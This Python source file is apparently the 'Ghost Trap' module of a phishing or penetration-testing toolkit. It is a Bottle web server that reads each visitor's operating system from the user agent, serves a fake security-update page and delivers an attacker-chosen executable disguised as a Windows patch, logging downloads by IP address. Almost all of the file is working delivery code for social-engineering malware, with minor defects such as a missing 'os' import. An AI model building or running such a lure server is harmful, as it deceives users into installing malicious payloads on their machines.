import re
import time
from PyQt4 import QtCore
from core.bottle import (Bottle,response,request,static_file,debug,redirect,run)

ghost_trap = Bottle()

class Ghost_Trap_http(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)
        self.control_settings = {}
        self.vulnerability_page = str()

        self.cookies = []       # response.set_cookies() does not work to my expectations :-(

        self.windows_payload_size = None
        self.linux_payload_size = None


    def read_source_file(self,path):
        '''Returns HTLML source page'''
        source_file = open(path)
        return(source_file.read())


    def set_payload_sizes(self):
        '''Sets and saves payload sizes'''
        self.windows_payload_size = self.file_size_calculator(self.control_settings['windows_payload'])
        self.linux_payload_size = self.file_size_calculator(self.control_settings['linux_payload'])


    def format_time(self):
        '''Returns the date,but returns the day before'''
        date = "%d/%d/%d"
        time_format = time.localtime()
        full_date = date % (time_format[2] - 1,time_format[1],time_format[0])
        return(full_date)


    def file_size_calculator(self,executable):
        '''Calculates the file size of payloads'''
        bytes_length = int(os.path.getsize(executable))
        if bytes_length < 1024:
            size = str(bytes_length) + 'Bytes'
            return(size)
        if bytes_length > 1024000:
            size = str(bytes_length/1024000) + 'MB'
            return(size)
        if bytes_length > 1024:
            size = str(bytes_length/1024) + 'KB'
            return(size)


    def get_executable_path(self,path_string):
        '''Gets the filename from the path'''
        file_name = path_string.rsplit('/')[-1]
        return(file_name)



    def get_vulnerability_page(self,os_type):
        '''Return HTML page according to OS type'''

        if re.search("window",os_type,re.IGNORECASE):
            page = self.read_source_file(self.control_settings['windows_webpage'])
            source_page = re.sub('ghost_date',self.format_time(),page)      # Cant't use %s because of html % conflicts, cant use {}.format() either for backward compatibility sakes
            source_page_2 = re.sub('ghost_file_size',self.windows_payload_size,source_page)
            source_page_3 = re.sub('ghost_payload_executable',self.get_executable_path(\
            self.control_settings['windows_payload']),source_page_2)
            return(source_page_3)
        else:
            page = self.read_source_file(self.control_settings['linux_webpage'])
            source_page = re.sub('ghost_date',self.format_time(),page)
            source_page_2 = re.sub('ghost_file_size',self.linux_payload_size,source_page)
            source_page_3 = re.sub('ghost_payload_executable',self.get_executable_path(\
            self.control_settings['linux_payload']),source_page_2)
            return(source_page_3)


    def has_settings(self,setting):                     # Check for settings
        '''Checks if settings for variable exists'''
        if(self.control_settings.has_key(setting)):
            return(True)
        else:
            return(False)


    def get_settings(self,setting):                     # Return settings
        '''Returns the settings from the settings file'''
        setting_variable = self.control_settings[setting]
        return(setting_variable)



    def directory_split(self,path):
        '''Returns tuple with directory name and filepath'''
        split_files = []
        file_split = path.split('/')
        split_files.append(file_split[-1])                      # File name (index.html)
        html_folder = re.findall("(\S*)\.",file_split[-1])[0]   # Holds variable like (index)
        split_files.append(html_folder + '_files')
        directory = re.sub(file_split[-1],"",path)
        split_files.append(directory)
        return(tuple(split_files))                  # ('index.html', 'index_files', '/root/Desktop/path/') for HTML
                                                    # ('Windows-RPC-KB925256-ENU.exe', 'Windows-RPC-KB925256-ENU_files', '/tmp/') for Executables

    def run(self):                                                              # Ghost trap starts here
        '''Starts HTTP Service'''
        #This decorator handles http get requests

        @ghost_trap.error(404)
        def error404(error):
            if request['REMOTE_ADDR'] not in self.cookies:
                operating_system = request['HTTP_USER_AGENT']
                source_page = self.get_vulnerability_page(operating_system)
                return(source_page)


        @ghost_trap.error(505)
        def error505(error):
            if request['REMOTE_ADDR'] not in self.cookies:
                operating_system = request['HTTP_USER_AGENT']
                source_page = self.get_vulnerability_page(operating_system)
                return(source_page)



        @ghost_trap.route('/')
        def default_page():

            self.control_settings['new connection'] = 'New connection from ' +\
            request['REMOTE_ADDR'] + ' ' + ('-'*4) + ' ' + request['HTTP_USER_AGENT']

            self.emit(QtCore.SIGNAL("got new connection"))                      # Anounce new connection

            if self.control_settings['cookies']:                                # Cookie processing is enabled
                if request['REMOTE_ADDR'] not in self.cookies:
                    if self.control_settings['answer all']:                         # if True (Answer all operating systems)
                        operating_system = request['HTTP_USER_AGENT']
                        source_page = self.get_vulnerability_page(operating_system)
                        return(source_page)

                    elif self.control_settings['answer windows']:                   # if True (Anwser only windows systems)
                        source_page = self.get_vulnerability_page("window")

                    else:
                        source_page = self.get_vulnerability_page("linux")
                        return(source_page)

            else:
                if self.control_settings['answer all']:                         # if True (Answer all operating systems)
                    operating_system = request['HTTP_USER_AGENT']
                    source_page = self.get_vulnerability_page(operating_system)
                    return(source_page)

                elif self.control_settings['answer windows']:                   # if True (Anwser only windows systems)
                    source_page = self.get_vulnerability_page("windows")

                else:
                    source_page = self.get_vulnerability_page("linux")
                    return(source_page)


        # This decorator handles payload downloads
        @ghost_trap.route('/' + self.directory_split(self.control_settings['windows_payload'])[0])  # Windows payload handler
        def download_windows_payload():
            self.cookies.append(request['REMOTE_ADDR'])                                             # Set client cookies
            self.control_settings['new download'] = request['REMOTE_ADDR'] + ' just downloaded the windows payload!'
            self.emit(QtCore.SIGNAL("new download"))
            executable_variable = self.directory_split(self.control_settings['windows_payload'])
            return(static_file(executable_variable[0],root = executable_variable[2],download = executable_variable[0]))


        @ghost_trap.route('/' + self.directory_split(self.control_settings['linux_payload'])[0])    # Linux payload handler
        def download_linux_payload():
            self.cookies.append(request['REMOTE_ADDR'])                                             # Set cookie
            self.control_settings['new download'] = request['REMOTE_ADDR'] + ' just downloaded the linux payload!'   # Anounce new download
            self.emit(QtCore.SIGNAL("new download"))
            executable_variable = self.directory_split(self.control_settings['linux_payload'])
            return(static_file(executable_variable[0],root = executable_variable[2],download = executable_variable[0]))


        # This decorator sends html script files to remote browser
        @ghost_trap.route('/' + self.directory_split(self.control_settings['windows_webpage'])[1]+ '/:filename#.*#')
        def html_files(filename):    # ('index.html', 'index_files', '/root/Desktop/path/') for HTML
            return(static_file(filename,root = self.directory_split(self.control_settings['windows_webpage'])[2] + \
            self.directory_split(self.control_settings['windows_webpage'])[1] + '/'))


        @ghost_trap.route('/' + self.directory_split(self.control_settings['linux_webpage'])[1]+ '/:filename#.*#')
        def html_files(filename):   # ('index.html', 'index_files', '/root/Desktop/path/') for HTML
            return(static_file(filename,root = self.directory_split(self.control_settings['linux_webpage'])[2] + \
            self.directory_split(self.control_settings['linux_webpage'])[1] + '/'))

        # debug(True)
        run(ghost_trap,host= str(self.control_settings['ip_address']),port=int(self.control_settings['port']),quiet=True)     # run(host='127.0.0.1',port=80)





